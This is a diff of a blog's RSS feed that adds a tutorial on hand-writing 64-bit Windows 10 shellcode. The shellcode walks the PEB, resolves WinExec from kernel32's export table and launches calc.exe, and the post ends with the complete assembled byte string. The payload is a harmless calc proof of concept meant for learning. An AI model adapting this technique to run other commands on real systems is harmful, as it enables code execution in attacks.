@@ -5,9 +5,317 @@
     <description>Malware Owl Blog on the Journey</description>
     <link>https://Owl4444.github.io/</link>
     <atom:link href="https://owl4444.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 09 Sep 2022 15:51:49 +0000</pubDate>
-    <lastBuildDate>Fri, 09 Sep 2022 15:51:49 +0000</lastBuildDate>
+    <pubDate>Sat, 10 Sep 2022 10:44:22 +0000</pubDate>
+    <lastBuildDate>Sat, 10 Sep 2022 10:44:22 +0000</lastBuildDate>
     <generator>Jekyll v4.2.2</generator>
+    
+      <item>
+        <title>Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2</title>
+        <description>&lt;h1 id=&quot;understanding-64-bits-windows-10-shellcode-calcexe---part-2&quot;&gt;Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 2&lt;/h1&gt;
+
+&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
+
+&lt;p&gt;Welcome back to the second part of understanding 64 bits Windows 10 shellcode. In Part 1, we have taken a look at we can get function address from any loaded modules. In this case, we were targetting the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinExec&lt;/code&gt; to execute commands, and we wanted to spawn calc.exe for this shellcode.&lt;/p&gt;
+
+&lt;p&gt;In this post, we will write our own shellcode following closely to what was described in the previous part. I am using the Miscrosoft Visual Studio’s Macro Assembler. Let’s dive straight in.&lt;/p&gt;
+
+&lt;h1 id=&quot;setting-up-the-environment&quot;&gt;Setting up the Environment&lt;/h1&gt;
+
+&lt;p&gt;First, we will create a new empty project. I am using Microsoft Visual Studio 2019, Community version.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/CreateNewEmptyProject.png&quot; alt=&quot;CreateNewEmptyProject.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After that, create two files:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;main.c&lt;/li&gt;
+  &lt;li&gt;shellcoding.asm&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Before writing any code, we will first configure Visual Studio so that we can work with the asm file.
+Right click on the project root folder (Not the solution) and select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Build Dependencies&lt;/code&gt;, then click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Build Customizations...&lt;/code&gt;. The Visual C++Build Cusomizations File Window should open. We will need to click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;masm&lt;/code&gt; checkbox to enable building with masm.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/build_customizations.png&quot; alt=&quot;build_customizations.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, right click on our shellcode.asm file and click on properties. We will wnat to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Item Type&lt;/code&gt; to Microsoft Macro Assembler.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/asm_config.png&quot; alt=&quot;asm_config.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, change the compilation configuration from x86 to x64 since we are aiming to deal with x64 shellcode.&lt;/p&gt;
+
+&lt;p&gt;At this point, we should be able to write and compile and a small test project.&lt;/p&gt;
+
+&lt;h2 id=&quot;testing-environment&quot;&gt;Testing Environment&lt;/h2&gt;
+
+&lt;p&gt;main.c :&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return the value 0x1337&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;shellcoding.asm :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;.code
+
+	shellcoding PROC PUBLIC
+	
+			xor rax, rax   
+			mov ax, 1337h  ; Stores return value in rax
+			ret
+
+	shellcoding ENDP
+
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you setup is running smoothly, you should see hex value 1337&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;getting-peb-from-teb&quot;&gt;Getting PEB from TEB&lt;/h2&gt;
+
+&lt;p&gt;BE WARNED, THIS SHELLCODE WAS WRITTEN JUST AS AN EXERCISE WITHOUT ANY FORM OF STRUCTURE. SO PLEASE FORGIVE ME FOR ANYTHING UNCONVENTIONAL, OR BAD CODING PRACTICES … IF ANY.&lt;/p&gt;
+
+&lt;p&gt;As reference, here is the full flow diagram of the path we are going to take to create the shellcode.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/Windows_Shellcoding_flow_dark.png&quot; alt=&quot;Windows_Shellcoding_flow_dark.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For starters, to get the Thread Environment Block (TEB) information, we will need to get it from the GS Segment at offset of 0x30 according to this &lt;a href=&quot;https://www.wikiwand.com/en/Win32_Thread_Information_Block&quot;&gt;site&lt;/a&gt;. Of course, we are able to get the Process Environment Block (PEB) straight from the GS Segment at offset 0x60, but for this exercise, we will just start from the TEB.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov rax, qword ptr gs:[00000030h] ; TEB 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After getting the TEB address, we can use the offset of 0x60 to get the address of the PEB.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov rax, qword ptr [rax + 60h] ; PEB
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, to get more data about the loaded modules, we want to find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InMemoryOrderModuleList&lt;/code&gt; which is offset of 0x10 from where Ldr is pointing to.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov rax, qword ptr [rax + 18h] ; _PEB_LDR_DATA
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After getting the pointer to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_LDR_DATA_TABLE_ENTRY&lt;/code&gt;, we can prepare for the traversal of the doubly linked-list  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_LIST_ENTRY&lt;/code&gt; by getting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InMemoryOrderLinks&lt;/code&gt; at offset 0x10 of the table entry. We will traverse the doubly linked-list twice to get to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kernel32.dll&lt;/code&gt; information. Once we have arrived, we can subtract 0x10 from the FLINK of the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_LIST_ENTRY&lt;/code&gt; to get to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_LDR_DATA_TABLE_ENTRY&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov rax, qword ptr [rax + 20h] ; InMemoryOrderModuleList
+    mov rax, [rax]; next flink 
+    mov rax, [rax]; next flink ; this should be kernel32.dll
+    lea rax,  [rax-10h] ; _LDR_DATA_TABLE_ENTRY
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since we are now at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_LDR_DATA_TABLE_ENTRY&lt;/code&gt; of kernel32.dll, we will want to record the DllBase for calculation of Virtual Addresses from RVA values later on. This DllBase contains the pointer to the loaded DLL which means that we should also be able to see the MZ Signature in memory.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov rax, qword ptr[rax+30h] ; RAX = The Dll base with MZ Signature
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next thing to do is to look for the export table. According to the chart, we have to first find the offset of the New EXE Header which is at offset 0x3c from the dll base address. After that, at fixed offset of 0x88, we will be able to find and calculate the Virtual Address of the Export Table.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    xor rbx, rbx                    ; clear just in case the upper 32 bits contains something
+    mov ebx, dword ptr [rax + 3ch]  ; Get offset of new Exe header 
+    add rbx, rax                    ; offset + Image Base (Virtual Address) - should see the &quot;PE&quot; header
+    xor rcx, rcx                    ; clear just in case the upper 32 bits 
+    mov ecx, dword ptr [rbx]		; Get RVA of Export Directory
+    add rcx, rax					;  RCX = Virtual Address of Export Directory
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For this shellcode, I have made some space on the stack for variables. Since I did not know initially how many variables I may need, I have created 0x90 bytes extra space at the start.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    push rbp 
+    mov rbp, rsp
+    sub rsp, 90h    ; Set some space for variables
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These are used to store some of the virtual addresses for possible future use. This may be redundant in the end but you can clean up this part should you want to optimize this shellcode in the near future.&lt;/p&gt;
+
+&lt;p&gt;Now, let’s calculate and store Virtual Addresses of the different tables.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    mov qword ptr [rbp-90h], rcx	; &amp;lt;------------- Virtual Address of Export Directory
+
+    xor rdx, rdx
+    mov edx, dword ptr [rcx + 1ch]   ; RVA of Function table
+    add rdx, rax                     ; Virtual Address of Function Table
+    mov qword ptr [rbp-70h], rdx     ; &amp;lt;------------ Virtual Address of function Table
+    
+    xor rbx, rbx
+    mov edx, dword ptr [rcx + 20h]   ; RVA of Name Table
+    add rdx, rax					 ; Virtual Address of Name Table
+    mov qword ptr [rbp-60h], rdx     ; &amp;lt;------------ Virtual Address of Name Table
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this stage, this is where we want to find the function name from the function name table by string comparison to get the ordinal value. A fast way to do this is to make use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;repe cmpsb&lt;/code&gt; instruction to so.&lt;/p&gt;
+
+&lt;p&gt;Since this is a 64 bit shellcode and the length “WinExec” is smaller than 8 bytes, we can just store the bytes into a register and push it onto the stack. Of course, we will need to push the string terminator to the stack first as well. Note that the bytes of “WinExec” should be in little Endian format.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    push rcx ; String terminator
+    mov rcx, 636578456e6957FFh		; WinExec string with FF which we will shift to fill in space
+    shr rcx, 8
+    push rcx						; Push the string value onto the stack
+    push rsp						; stack address to targeted function name &quot;WinExec&quot;
+
+    xor rcx, rcx
+    mov cl, 07h;; length of the string &quot;WinExec&quot;
+	push rcx                        ; push on to the stack so I can group the variables together for easier reference
+
+    pop r8							; &amp;lt;----- Function name Length and the counter
+    pop r9							; &amp;lt;----- String Address to WinExec string
+    xor r12, r12					; &amp;lt;----- used to store the ordinal N
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Before proceeding, let us understand the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;repe cmpsb&lt;/code&gt; instruction better.&lt;/p&gt;
+
+&lt;p&gt;This instruction would make use of&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;rcx as a counter (decrement upon each comparison of bytes)
+    &lt;ul&gt;
+      &lt;li&gt;Thus have to store the length of “WinExec” - we already have this&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;rdi as the destination string register&lt;/li&gt;
+  &lt;li&gt;rsi as the source string register&lt;/li&gt;
+  &lt;li&gt;zero flag
+    &lt;ul&gt;
+      &lt;li&gt;if not zero, then it is a mismatch (jne)&lt;/li&gt;
+      &lt;li&gt;if mismatch we will want to create a loop&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    IterateAndCompareFunctionName:
+
+        mov rcx, r8							; act as counter for the loop - re-update since rcx is decremented
+        mov rsi, r9							; putting the WinExec String pointer to the source register for repe cmpsb part
+        mov rdx, qword ptr [rbp-60h]		; Virtual Address of Name Table
+        mov edx, dword ptr [rdx + r12*4]	; RVA of nth string and *4 because that is the size of RVA in the name table 
+        inc r12								; increment the ordinal value
+        lea r11, [rdx+ rax]					; Virtual Address of first string  (RVA + Base Address)
+        mov rdi, r11						; Move that virtual address to destination register for repe cmpsb part
+        repe cmpsb							; compare the two strings between source and destination register for rcx number of bytes
+        jne IterateAndCompareFunctionName   ; jne if mismatch
+
+    add rsp, 10h       ; do stack house keeping ( remember we pushed the string on to the stack ) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we are out of the loop, this means that we have found the string and have the stored ordinal in register r12. It is now time to find the Virtual address of “WinExec” function. Here is the pseudocode that we are going to follow to find the Virtual Address of the “WinExec” Function.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WinExecVirtualAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;functionAddressTable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ordinal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;DllBaseAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Converting that to asm, we have the following :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    ;; Now, the function address table contains the RVA (DWORD) to the function address, we can use the 
+    ;; In Pseudocode, we want to see this
+    ;; DWORD RVA = *(DWORD*)((BYTE*)&amp;amp;functionAddressTable + (ordinal-1)*sizeof(DWORD))
+    ;; We decrease ordinal value by 1 since ordinal starts at 1 but offset starts at 0
+    ;; in the function address table
+
+    dec r12							; (ordinal-1)
+    xor rdi, rdi
+    xor rdx, rdx
+    mov dl, 04h
+    add rdi, rdx					; size of dword
+
+    push rax						; preserve the dll base address
+    mov rax, rdi					; store rax to mulitply with (sizeof(DWORD))
+    mov rsi, r12					; (ordinal-1)
+    imul rsi						; (ordinal-1)*sizeof(DWORD)		
+    mov rsi, rax					; rsi = (ordinal-1)*sizeof(DWORD)
+    pop rax							; restore the base address for calculation of virtual address
+    
+    mov rdi, qword ptr [rbp-70h]	; Virtual Address of Function Address Table
+    lea rdi, [rdi + rsi]			; (DWORD*)((BYTE*)&amp;amp;functionAddressTable + (ordinal-1)*sizeof(DWORD))
+    mov edi, dword ptr [rdi]		; Dereference to get the RVA of the &quot;WinExec&quot; function&quot;
+    add rdi, rax					; Get Virtual Address of WinExec by adding Dll base address
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can effectively attempt to call the WinExec function.&lt;/p&gt;
+
+&lt;p&gt;This is what we can do :&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;create the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\System32\calc.exe&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Store the pointer to the string into rcx (first argument of WinExec)&lt;/li&gt;
+  &lt;li&gt;Store the value 1 into rdx (second argument == SW_SHOWNORMAL)&lt;/li&gt;
+  &lt;li&gt;call register rdi (containing the Virtual Address of WinExec)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    ;; Now address of WinExec is in rdi
+    ;; Write string of calc.exe into the stack and get the stack pointer before calling 
+
+    mov rbx, 6578652e41414141h  ; exe.AAAA
+    shr rbx, 32                 ;  &quot;.exe\x00\x00\x00\x00&quot;
+    push rbx    
+    mov rbx, 636c61635c32336dh  ; 
+    push rbx
+    mov rbx, 65747379735c7377h  ; \sw
+    push rbx
+    mov rbx, 6f646e69575c3a43h  ; odniW\:C
+    push rbx                        
+    push rsp  ; Push the stackpointer pointing to the calc.exe string
+
+    pop rcx   ; pass in as first argumnent
+    inc rdx   ; SW_SHOWNORMAL as second argument
+    
+    call rdi  ; Call WinExec
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let’s now set a breakpoint at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call rdi&lt;/code&gt; and see the result of arguments !&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/winexec_correctargs.png&quot; alt=&quot;winexec_correctargs.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To verify that register rdi is indeed WinExec, let’s check from WinDBG :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/winexec_correctfunction.png&quot; alt=&quot;winexec_correctfunction.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now, all seems to be correct however, our calculator is not being spawned @.@&lt;/p&gt;
+
+&lt;p&gt;Now to understand why this is the case, we will realise that the stack values is being altered in the previous stack frame. We can see that in the highlighted region.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/destroyingstack.png&quot; alt=&quot;destroyingstack.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To solve this, we should pivot the stack just a little.&lt;/p&gt;
+
+&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;pop rcx   ; pass in as first argumnent
+inc rdx   ; SW_SHOWNORMAL
+&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+ sub rsp, 20h   ; Avoid messing with stack for the top 0x20 bytes
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;call rdi  ; Call WinExec
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this, we should be successful in spawning a calc :D&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/windows10shellcodePart2/calc.png&quot; alt=&quot;calc.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The following is the assembled bytes from https://defuse.ca/online-x86-assembler.htm#disassembly. You can immediately use and test if it works on your PC.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x55\x48\x89\xE5\x48\x81\xEC\x90\x00\x00\x00\x48\x31\xC0\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8D\x40\xF0\x48\x8B\x40\x30\x48\x31\xDB\x8B\x58\x3C\x48\x01\xC3\x48\x81\xC3\x88\x00\x00\x00\x48\x31\xC9\x8B\x0B\x48\x01\xC1\x48\x89\x8D\x70\xFF\xFF\xFF\x48\x31\xD2\x8B\x51\x1C\x48\x01\xC2\x48\x89\x55\x90\x48\x31\xDB\x8B\x51\x20\x48\x01\xC2\x48\x89\x55\xA0\x48\x31\xC9\x48\x31\xD2\x51\x48\xB9\xFF\x57\x69\x6E\x45\x78\x65\x63\x48\xC1\xE9\x08\x51\x54\x48\x31\xC9\xB1\x07\x51\x41\x58\x41\x59\x4D\x31\xE4\x4C\x89\xC1\x4C\x89\xCE\x48\x8B\x55\xA0\x42\x8B\x14\xA2\x49\xFF\xC4\x4C\x8D\x1C\x02\x4C\x89\xDF\xF3\xA6\x75\xE4\x48\x83\xC4\x10\x49\xFF\xCC\x48\x31\xFF\x48\x31\xD2\xB2\x04\x48\x01\xD7\x50\x48\x89\xF8\x4C\x89\xE6\x48\xF7\xEE\x48\x89\xC6\x58\x48\x8B\x7D\x90\x48\x8D\x3C\x37\x8B\x3F\x48\x01\xC7\x48\xBB\x41\x41\x41\x41\x2E\x65\x78\x65\x48\xC1\xEB\x20\x53\x48\xBB\x6D\x33\x32\x5C\x63\x61\x6C\x63\x53\x48\xBB\x77\x73\x5C\x73\x79\x73\x74\x65\x53\x48\xBB\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x53\x54\x59\x48\xFF\xC2\x48\x83\xEC\x20\xFF\xD7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;During the two days of looking through shellcodes, I think I have gotten a good idea of how shellcodes is being created. Hopefully, this had helped you have a much clearer and concrete understanding about basic shellcoding as well and go on to create other kinds of shellcode!&lt;/p&gt;
+
+&lt;p&gt;You can refer to the &lt;a href=&quot;https://github.com/Owl4444/Understanding_Windows_Shellcoding&quot;&gt;my github repository&lt;/a&gt; for the full code.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+</description>
+        <pubDate>Fri, 09 Sep 2022 22:31:00 +0000</pubDate>
+        <link>https://owl4444.github.io/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</link>
+        <guid isPermaLink="true">https://owl4444.github.io/2022/09/09/Understanding_64_bits_Windows_10_Shellcode_part_2/</guid>
+        
+        <category>Writeups</category>
+        
+        
+      </item>
     
       <item>
         <title>Understanding 64 bits Windows 10 Shellcode (Calc.exe) - Part 1</title>
